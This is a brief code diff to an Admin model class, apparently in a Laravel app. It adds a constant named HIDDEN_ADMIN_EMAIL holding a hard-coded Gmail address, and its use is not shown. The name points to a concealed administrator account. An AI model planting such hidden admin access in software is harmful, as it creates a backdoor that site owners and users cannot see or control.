@@ -13,6 +13,8 @@ class Admin extends Authenticatable
 {
     use HasApiTokens, HasFactory, Notifiable, HasRoles;
 
+    public const HIDDEN_ADMIN_EMAIL = 'softwebdigital@gmail.com';
+
     protected $fillable = [
         'name',
         'email',
